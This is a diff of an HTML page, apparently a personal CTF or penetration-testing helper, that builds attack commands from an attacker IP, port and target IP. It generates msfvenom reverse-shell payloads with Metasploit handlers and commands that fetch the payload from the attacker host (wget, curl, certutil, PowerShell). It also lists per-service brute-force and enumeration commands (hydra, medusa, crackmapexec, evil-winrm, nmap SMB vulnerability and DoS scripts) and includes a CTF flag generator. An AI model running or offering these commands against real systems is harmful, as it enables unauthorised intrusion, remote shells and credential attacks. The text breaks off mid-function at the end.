@@ -15,153 +15,151 @@
     a:hover{color:red;}
 </style> 
 
-<center>
-    <p>
-        <a href="https://gchq.github.io/CyberChef/">CyberChef</a> |
-        <a href="https://book.hacktricks.xyz/">book.hacktricks.xyz</a> |
-        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a> |
-        <a href="https://gtfobins.github.io/">gtfobins</a> |
-        <a href="https://lolbas-project.github.io/">lolbas</a>
-    </p>
-    <hr>
-    <input type="text" name="lhost" id="lhost" value="192.168.119.227" size="16" oninput="generate()">
-    <input type="text" name="lport" id="lport" value="8990" size="4" oninput="generate()">
-    <input type="text" name="rhost" id="rhost" value="10.10.10.123" size="16" oninput="generate()">
-    <pre id="output"></pre>
-    <pre id="output2"></pre>
-    <script type="text/javascript">
-        function generate() {
-            let lhost = document.getElementById("lhost").value;
-            let lport = document.getElementById("lport").value;
-            let rhost = document.getElementById("rhost").value;
-            document.getElementById("output").innerHTML = "msfvenom -p windows/x64/shell_reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f exe -o yz.exe\nmsfconsole -q -x 'use multi/handler; set payload windows/x64/shell_reverse_tcp; set lhost "+lhost+"; set lport "+lport+"; exploit'\n\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f elf -o yz.elf\nmsfconsole -q -x 'use multi/handler; set payload linux/x64/shell_reverse_tcp; set lhost "+lhost+"; set lport "+lport+"; exploit'\n\npython3 -m http.server 8000\npython2 -m SimpleHTTPServer 8000\n\nwget http://"+lhost+":8000/yz.elf\ncurl http://"+lhost+":8000/yz.elf -o yz.elf\n\ncertutil.exe -urlcache -split -f 'http://"+lhost+":8000/yz.exe' yz.exe\npowershell.exe IWR http://"+lhost+":8000/yz.exe -OutFile yz.exe\nIWR http://"+lhost+":8000/yz.exe -OutFile yz.exe";
-            document.getElementById("output2").innerHTML = '# Network services\n\n## 21 - FTP\n\nhydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr ftp://'+rhost+'\nmedusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -M ftp -h '+rhost+'\n\nnmap -sV -p 21 --script="banner,(ftp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 22 - SSH\n\nhydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr ssh://'+rhost+'\nmedusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -M ssh -h '+rhost+'\n\nnmap -sV -p 22 --script="banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods" '+rhost+'\n\n## 22 - RSYNC\n\nrsync -av --list-only rsync://'+rhost+'\n\nnmap -sV -p 22 --script="banner,(rsync* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 23 - TELNET\n\nnmap -sV -p 23 --script="banner,telnet-encryption,telnet-ntlm-info" '+rhost+'\n\n## 25 - SMTP\n\nhydra smtp-enum://'+rhost+'/vrfy -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"\nhydra smtp-enum://'+rhost+'/expn -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"\nhydra smtp-enum://'+rhost+'/rcpt -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -p DOMAIN\n\nnmap -sV -p 25 --script="banner,(smtp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 161, 162 - SNMP\n\nnmap -sV -p 161,162 --script="banner,(snmp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 53 - DNS\n\ndig -p 53 -x '+rhost+' @'+rhost+'\ndig AXFR -p 53 @'+rhost+'\ndig AXFR -p 53 @'+rhost+' '+rhost+'\ndig AXFR -p 53 @'+rhost+' DOMAIN\ndnsrecon -n '+rhost+' -d DOMAIN -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t brt\ndnsrecon -n '+rhost+' -d DOMAIN\n\nnmap -sV -p 53 --script="banner,(dns* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 69 - TFTP\n\nnmap -sV -p 69 --script="banner,tftp-enum" '+rhost+'\n\n## 79 - FINGER\n\nnmap -sV -p 79 --script="banner,finger" '+rhost+'\n\n## 88 - KERBEROS\n\nnmap -sV -p 88 --script="banner,krb5-enum-users" --script-args krb5-enum-users.realm="DOMAIN",userdb="USERLIST" '+rhost+'\nnmap -sV -p 88 --script="banner,krb5-enum-users" '+rhost+'\n\n## 80, 443 - HTTP\n\nnikto -ask=no -h http://'+rhost+'\n\nwpscan --url http://'+rhost+'/ --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive\n\nwhatweb --no-errors -a 3 -v http://'+rhost+'\n\nffuf -u http://HOSTNAME/ -t 16 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.HOSTNAME" -noninteractive -s\ngobuster dns -d HOSTNAME -r '+rhost+' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n\nsslscan --show-certificate '+rhost+'\n\nhydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr http-get://'+rhost+'/path/to/auth/area\nhydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr http-post-form://'+rhost+'/path/to/login.php:"username=^USER^&password=^PASS^":"invalid-login-message"\n\nmedusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -M http -h '+rhost+' -m DIR:/path/to/auth/area\nmedusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -M web-form -h '+rhost+' -m FORM:/path/to/login.php -m FORM-DATA:"post?username=&password=" -m DENY-SIGNAL:"invalid login message"\n\nferoxbuster -t 16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://'+rhost+'/\ngobuster dir -t 16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://'+rhost+'/\ndirsearch -t 16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://'+rhost+'/\nffuf -t 16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://'+rhost+'/FUZZ\ndirb http://'+rhost+'/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n\nnmap -sV -p 80 --script="banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" '+rhost+'\n\n## 110, 995 - POP3\n\nnmap -sV -p 110,995 --script="banner,(pop3* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 111, 2049 - NFS\n\nshowmount -e '+rhost+'\n\nnmap -sV -p 111,2049 --script="banner,(rpcinfo or nfs*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 111, 5900 - Mountd\n\nnmap -sV -p 111,5900 --script="banner,nfs* and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 119 - NNTP\n\nnmap -sV -p 119 --script="banner,nntp-ntlm-info" '+rhost+'\n\n## 123 - NTP\n\nnmap -sV -p 123 --script="banner,(ntp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 135 - MSRPC\n\nimpacket-getArch -target '+rhost+'\n\n## 135, 139, 443, 445, 593 - RPC\n\nrpcclient -p PORT -U "" '+rhost+'\nimpacket-rpcdump -port PORT '+rhost+'\n\nnmap -sV -p 135,139,443,445,593 --script="banner,msrpc-enum,rpc-grind,rpcinfo" '+rhost+'\n\n## 139 - NETBIOS\n\nenum4linux -a -M -l -d '+rhost+'\nenum4linux-ng -A -d -v '+rhost+'\nnbtscan -rvh '+rhost+'\n\n## 143, 993, 995 - IMAP\n\nnmap -sV -p 143,993,995 --script="banner,(imap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 161 - SNMP\n\nsnmpwalk -c public -v 1 '+rhost+'\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.2.1.25.1.6.0\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.2.1.25.4.2.1.2\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.2.1.25.4.2.1.4\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.2.1.25.2.3.1.4\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.2.1.25.2.3.1.4\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.4.1.77.1.2.25\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.2.1.6.13.1.3\n\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -dd '+rhost+'\n\n## 389 - LDAP\n\nenum4linux -a -M -l -d '+rhost+'\nenum4linux-ng -A -d -v '+rhost+'\nldapsearch -x -D USER -w PASS -H ldap://'+rhost+' -b "dc=example,dc=com" -s sub "(objectclass=*)"\n\nnmap -sV -p 389 --script="banner,(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 445 - SMB\n\nenum4linux -a -M -l -d '+rhost+'\nenum4linux-ng -A -d -v '+rhost+'\nnbtscan -rvh '+rhost+'\nlookupsid.py USER:PASS@'+rhost+'\n\nnmap -sV -p 445 --script="smb-vuln-*" --script-args="unsafe=1" '+rhost+'\nnmap -sV -p 445 --script="smb-vuln-* and dos" --script-args="unsafe=1" '+rhost+'\n\nnmap -sV -p 445 --script="banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\nsmbclient -L //'+rhost+' -N -I '+rhost+'\n\nsmbmap -H '+rhost+'\nsmbmap -u null -p "" -H '+rhost+'\nsmbmap -H '+rhost+' -R\nsmbmap -u null -p "" -H '+rhost+' -R\nsmbmap -H '+rhost+' -x "ipconfig /all"\nsmbmap -u null -p "" -H '+rhost+' -x "ipconfig /all\n\n## 631 - CUPS\n\nnmap -sV -p 631 --script="banner,(cups* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 1099 - RMI\n\nnmap -sV -p 1099 --script="banner,rmi-vuln-classloader,rmi-dumpregistry" '+rhost+'\n\n## 1433 - MSSQL\n\nsqsh -U USER -P PASS -S '+rhost+':1433\nnmap -sV -p 1433 --script="banner,(ms-sql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="mssql.instance-port=PORT,mssql.username=sa,mssql.password=sa" '+rhost+'\n\n## 3306 - MySQL\n\nsqsh -U USER -P PASS -S '+rhost+':3306\nnmap -sV -p 3306 --script="banner,(mysql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 3389 - RDP\n\nhydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr rdp://'+rhost+'\nmedusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -M rdp -h '+rhost+'\n\nnmap -sV -p 3389 --script="banner,(rdp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 3632 - DISTCCD\n\nnmap -sV -p 3632 --script="banner,distcc-cve2004-2687" --script-args="distcc-cve2004-2687.cmd=id" '+rhost+'\n\n## 5060, 5061, 5062 - SIP\n\nsvwar -D -m INVITE '+rhost+'\n\nnmap -sV -p 5060,5061,5062 --script="banner,sip-enum-users,sip-methods" '+rhost+'\n\n## 5353 - mDNS\n\nnmap -sV -p 5353 --script="banner,(dns* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 5800, 5900 - VNC\n\nnmap -sV -p 5800,5900 --script="banner,(vnc* or realvnc* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="unsafe=1" '+rhost+'\n\n## 5985 - WINRM\n\ncrackmapexec winrm '+rhost+' -d DOMAIN -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/seclists/Passwords/darkweb2017-top100.txt\ncrackmapexec winrm '+rhost+' -d DOMAIN -u USER -p PASS -x "whoami"\nevil-winrm -u USER -p PASS -i '+rhost+'\nevil-winrm -u USER -H HASH -i '+rhost+'\n\n## 6379 - Redis\n\nredis-cli -p 6379 -h '+rhost+' INFO\nredis-cli -p 6379 -h '+rhost+' CONFIG GET "*"\nredis-cli -p 6379 -h '+rhost+' CLIENT LIST\n\nnmap -sV -p 6379 --script="banner,redis-info" '+rhost+'\n\n## 6660 - IRC\n\nnmap -sV -p 6660 --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor '+rhost+'\n\n## 8009 - AJP\n\nnmap -sV -p 8009 --script="banner,(ajp-* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 27017 - MongoDB\n\nnmap -sV -p 27017 --script="banner,(mongodb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n';
+<p>
+<a href="https://gchq.github.io/CyberChef/">CyberChef</a> |
+<a href="https://book.hacktricks.xyz/">book.hacktricks.xyz</a> |
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a> |
+<a href="https://gtfobins.github.io/">gtfobins</a> |
+<a href="https://lolbas-project.github.io/">lolbas</a>
+</p>
+<hr>
+<input type="text" name="lhost" id="lhost" value="192.168.119.227" size="16" oninput="generate()">
+<input type="text" name="lport" id="lport" value="8990" size="4" oninput="generate()">
+<input type="text" name="rhost" id="rhost" value="10.10.10.123" size="16" oninput="generate()">
+<pre id="output"></pre>
+<pre id="output2"></pre>
+<script type="text/javascript">
+function generate() {
+    let lhost = document.getElementById("lhost").value;
+    let lport = document.getElementById("lport").value;
+    let rhost = document.getElementById("rhost").value;
+    document.getElementById("output").innerHTML = "msfvenom -p windows/x64/shell_reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f exe -o yz.exe\nmsfconsole -q -x 'use multi/handler; set payload windows/x64/shell_reverse_tcp; set lhost "+lhost+"; set lport "+lport+"; exploit'\n\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f elf -o yz.elf\nmsfconsole -q -x 'use multi/handler; set payload linux/x64/shell_reverse_tcp; set lhost "+lhost+"; set lport "+lport+"; exploit'\n\npython3 -m http.server 8000\npython2 -m SimpleHTTPServer 8000\n\nwget http://"+lhost+":8000/yz.elf\ncurl http://"+lhost+":8000/yz.elf -o yz.elf\n\ncertutil.exe -urlcache -split -f 'http://"+lhost+":8000/yz.exe' yz.exe\npowershell.exe IWR http://"+lhost+":8000/yz.exe -OutFile yz.exe\nIWR http://"+lhost+":8000/yz.exe -OutFile yz.exe";
+    document.getElementById("output2").innerHTML = '# Network services\n\n## 21 - FTP\n\nhydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr ftp://'+rhost+'\nmedusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -M ftp -h '+rhost+'\n\nnmap -sV -p 21 --script="banner,(ftp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 22 - SSH\n\nhydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr ssh://'+rhost+'\nmedusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -M ssh -h '+rhost+'\n\nnmap -sV -p 22 --script="banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods" '+rhost+'\n\n## 22 - RSYNC\n\nrsync -av --list-only rsync://'+rhost+'\n\nnmap -sV -p 22 --script="banner,(rsync* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 23 - TELNET\n\nnmap -sV -p 23 --script="banner,telnet-encryption,telnet-ntlm-info" '+rhost+'\n\n## 25 - SMTP\n\nhydra smtp-enum://'+rhost+'/vrfy -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"\nhydra smtp-enum://'+rhost+'/expn -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"\nhydra smtp-enum://'+rhost+'/rcpt -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -p DOMAIN\n\nnmap -sV -p 25 --script="banner,(smtp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 161, 162 - SNMP\n\nnmap -sV -p 161,162 --script="banner,(snmp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 53 - DNS\n\ndig -p 53 -x '+rhost+' @'+rhost+'\ndig AXFR -p 53 @'+rhost+'\ndig AXFR -p 53 @'+rhost+' '+rhost+'\ndig AXFR -p 53 @'+rhost+' DOMAIN\ndnsrecon -n '+rhost+' -d DOMAIN -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t brt\ndnsrecon -n '+rhost+' -d DOMAIN\n\nnmap -sV -p 53 --script="banner,(dns* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 69 - TFTP\n\nnmap -sV -p 69 --script="banner,tftp-enum" '+rhost+'\n\n## 79 - FINGER\n\nnmap -sV -p 79 --script="banner,finger" '+rhost+'\n\n## 88 - KERBEROS\n\nnmap -sV -p 88 --script="banner,krb5-enum-users" --script-args krb5-enum-users.realm="DOMAIN",userdb="USERLIST" '+rhost+'\nnmap -sV -p 88 --script="banner,krb5-enum-users" '+rhost+'\n\n## 80, 443 - HTTP\n\nnikto -ask=no -h http://'+rhost+'\n\nwpscan --url http://'+rhost+'/ --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive\n\nwhatweb --no-errors -a 3 -v http://'+rhost+'\n\nffuf -u http://HOSTNAME/ -t 16 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.HOSTNAME" -noninteractive -s\ngobuster dns -d HOSTNAME -r '+rhost+' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n\nsslscan --show-certificate '+rhost+'\n\nhydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr http-get://'+rhost+'/path/to/auth/area\nhydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr http-post-form://'+rhost+'/path/to/login.php:"username=^USER^&password=^PASS^":"invalid-login-message"\n\nmedusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -M http -h '+rhost+' -m DIR:/path/to/auth/area\nmedusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -M web-form -h '+rhost+' -m FORM:/path/to/login.php -m FORM-DATA:"post?username=&password=" -m DENY-SIGNAL:"invalid login message"\n\nferoxbuster -t 16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://'+rhost+'/\ngobuster dir -t 16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://'+rhost+'/\ndirsearch -t 16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://'+rhost+'/\nffuf -t 16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://'+rhost+'/FUZZ\ndirb http://'+rhost+'/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n\nnmap -sV -p 80 --script="banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" '+rhost+'\n\n## 110, 995 - POP3\n\nnmap -sV -p 110,995 --script="banner,(pop3* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 111, 2049 - NFS\n\nshowmount -e '+rhost+'\n\nnmap -sV -p 111,2049 --script="banner,(rpcinfo or nfs*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 111, 5900 - Mountd\n\nnmap -sV -p 111,5900 --script="banner,nfs* and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 119 - NNTP\n\nnmap -sV -p 119 --script="banner,nntp-ntlm-info" '+rhost+'\n\n## 123 - NTP\n\nnmap -sV -p 123 --script="banner,(ntp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 135 - MSRPC\n\nimpacket-getArch -target '+rhost+'\n\n## 135, 139, 443, 445, 593 - RPC\n\nrpcclient -p PORT -U "" '+rhost+'\nimpacket-rpcdump -port PORT '+rhost+'\n\nnmap -sV -p 135,139,443,445,593 --script="banner,msrpc-enum,rpc-grind,rpcinfo" '+rhost+'\n\n## 139 - NETBIOS\n\nenum4linux -a -M -l -d '+rhost+'\nenum4linux-ng -A -d -v '+rhost+'\nnbtscan -rvh '+rhost+'\n\n## 143, 993, 995 - IMAP\n\nnmap -sV -p 143,993,995 --script="banner,(imap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 161 - SNMP\n\nsnmpwalk -c public -v 1 '+rhost+'\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.2.1.25.1.6.0\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.2.1.25.4.2.1.2\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.2.1.25.4.2.1.4\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.2.1.25.2.3.1.4\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.2.1.25.2.3.1.4\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.4.1.77.1.2.25\nsnmpwalk -c public -v 1 '+rhost+' 1.3.6.1.2.1.6.13.1.3\n\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -dd '+rhost+'\n\n## 389 - LDAP\n\nenum4linux -a -M -l -d '+rhost+'\nenum4linux-ng -A -d -v '+rhost+'\nldapsearch -x -D USER -w PASS -H ldap://'+rhost+' -b "dc=example,dc=com" -s sub "(objectclass=*)"\n\nnmap -sV -p 389 --script="banner,(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 445 - SMB\n\nenum4linux -a -M -l -d '+rhost+'\nenum4linux-ng -A -d -v '+rhost+'\nnbtscan -rvh '+rhost+'\nlookupsid.py USER:PASS@'+rhost+'\n\nnmap -sV -p 445 --script="smb-vuln-*" --script-args="unsafe=1" '+rhost+'\nnmap -sV -p 445 --script="smb-vuln-* and dos" --script-args="unsafe=1" '+rhost+'\n\nnmap -sV -p 445 --script="banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\nsmbclient -L //'+rhost+' -N -I '+rhost+'\n\nsmbmap -H '+rhost+'\nsmbmap -u null -p "" -H '+rhost+'\nsmbmap -H '+rhost+' -R\nsmbmap -u null -p "" -H '+rhost+' -R\nsmbmap -H '+rhost+' -x "ipconfig /all"\nsmbmap -u null -p "" -H '+rhost+' -x "ipconfig /all\n\n## 631 - CUPS\n\nnmap -sV -p 631 --script="banner,(cups* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 1099 - RMI\n\nnmap -sV -p 1099 --script="banner,rmi-vuln-classloader,rmi-dumpregistry" '+rhost+'\n\n## 1433 - MSSQL\n\nsqsh -U USER -P PASS -S '+rhost+':1433\nnmap -sV -p 1433 --script="banner,(ms-sql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="mssql.instance-port=PORT,mssql.username=sa,mssql.password=sa" '+rhost+'\n\n## 3306 - MySQL\n\nsqsh -U USER -P PASS -S '+rhost+':3306\nnmap -sV -p 3306 --script="banner,(mysql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 3389 - RDP\n\nhydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr rdp://'+rhost+'\nmedusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -M rdp -h '+rhost+'\n\nnmap -sV -p 3389 --script="banner,(rdp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 3632 - DISTCCD\n\nnmap -sV -p 3632 --script="banner,distcc-cve2004-2687" --script-args="distcc-cve2004-2687.cmd=id" '+rhost+'\n\n## 5060, 5061, 5062 - SIP\n\nsvwar -D -m INVITE '+rhost+'\n\nnmap -sV -p 5060,5061,5062 --script="banner,sip-enum-users,sip-methods" '+rhost+'\n\n## 5353 - mDNS\n\nnmap -sV -p 5353 --script="banner,(dns* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 5800, 5900 - VNC\n\nnmap -sV -p 5800,5900 --script="banner,(vnc* or realvnc* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="unsafe=1" '+rhost+'\n\n## 5985 - WINRM\n\ncrackmapexec winrm '+rhost+' -d DOMAIN -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/seclists/Passwords/darkweb2017-top100.txt\ncrackmapexec winrm '+rhost+' -d DOMAIN -u USER -p PASS -x "whoami"\nevil-winrm -u USER -p PASS -i '+rhost+'\nevil-winrm -u USER -H HASH -i '+rhost+'\n\n## 6379 - Redis\n\nredis-cli -p 6379 -h '+rhost+' INFO\nredis-cli -p 6379 -h '+rhost+' CONFIG GET "*"\nredis-cli -p 6379 -h '+rhost+' CLIENT LIST\n\nnmap -sV -p 6379 --script="banner,redis-info" '+rhost+'\n\n## 6660 - IRC\n\nnmap -sV -p 6660 --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor '+rhost+'\n\n## 8009 - AJP\n\nnmap -sV -p 8009 --script="banner,(ajp-* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n## 27017 - MongoDB\n\nnmap -sV -p 27017 --script="banner,(mongodb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" '+rhost+'\n\n';
+}
+generate();
+</script>
+<hr>
+<input type="text" id="prefix" value="flag" placeholder="flag" oninput="flaginate()">
+<input type="text" id="string" value="this is only a test flag!!" oninput="flaginate()">
+<p id="result">flag{TH15_IS_0nly_A_tEst_flag!!}</p>
+<script type="text/javascript">
+	function flaginate_char(char) {
+		let substitutions = ["Aa4", "Bb", "Cc", "Dd", "Ee3", "Ff", "Gg", "Hh", "Ii1", "Jj", "Kk", "Ll", "Mm", "Nn", "Oo0", "Pp", "Qq", "Rr", "Ss5", "Tt", "Uu", "Vv", "Ww", "Xx", "Yy", "Zz2"];
+		for (var i = 0; i < substitutions.length; i++) {
+			if ( substitutions[i].indexOf(char) >= 0) {
+				return substitutions[i][Math.floor(Math.random() * substitutions[i].length)];
+			} 
+		}
+		if ( char === " " || char === "_" ) {
+			return "_";
+		}
+		return char;
 	}
-        generate();
-    </script>
-    <hr>
-    <input type="text" id="prefix" value="flag" placeholder="flag" oninput="flaginate()">
-	<input type="text" id="string" value="this is only a test flag!!" oninput="flaginate()">
-	<p id="result">flag{TH15_IS_0nly_A_tEst_flag!!}</p>
-	<script type="text/javascript">
-		function flaginate_char(char) {
-			let substitutions = ["Aa4", "Bb", "Cc", "Dd", "Ee3", "Ff", "Gg", "Hh", "Ii1", "Jj", "Kk", "Ll", "Mm", "Nn", "Oo0", "Pp", "Qq", "Rr", "Ss5", "Tt", "Uu", "Vv", "Ww", "Xx", "Yy", "Zz2"];
-			for (var i = 0; i < substitutions.length; i++) {
-				if ( substitutions[i].indexOf(char) >= 0) {
-					return substitutions[i][Math.floor(Math.random() * substitutions[i].length)];
-				} 
-			}
-			if ( char === " " || char === "_" ) {
-				return "_";
-			}
-			return char;
+	function flaginate() {
+		let prefix = document.getElementById("prefix").value;
+		let string = document.getElementById("string").value;
+		let result = "";
+		for (var i = 0; i < string.length; i++) {
+			result += flaginate_char(string[i]);
 		}
-		function flaginate() {
-			let prefix = document.getElementById("prefix").value;
-			let string = document.getElementById("string").value;
-			let result = "";
-			for (var i = 0; i < string.length; i++) {
-				result += flaginate_char(string[i]);
-			}
-			document.getElementById("result").innerHTML = prefix + "{" + result + "}";
-		}
-		flaginate();
-	</script>
-    <hr>
-    <p id="username"></p>
-    <p id="password"></p>
-    <script type="module">
-      import init, {user, pass} from "./hello_wasm.js";
-      init()
-        .then(() => {
-          document.getElementById("username").innerHTML =  user(4, 8, 1000)
-          document.getElementById("password").innerHTML =  pass(8, 4)
-        });
-    </script>
-    <hr>
-  <script>
-    function eeeeehhhm(ip){
-      const decimalv1 = 'http://' + ip
-      const hexv1 = ip.split('.').reduce((acc, cur, i, arr) => {
-        return acc + '0x' + parseInt(cur).toString(16) + (arr.length-1 !== i ? '.' : '')
-      }, 'http://')
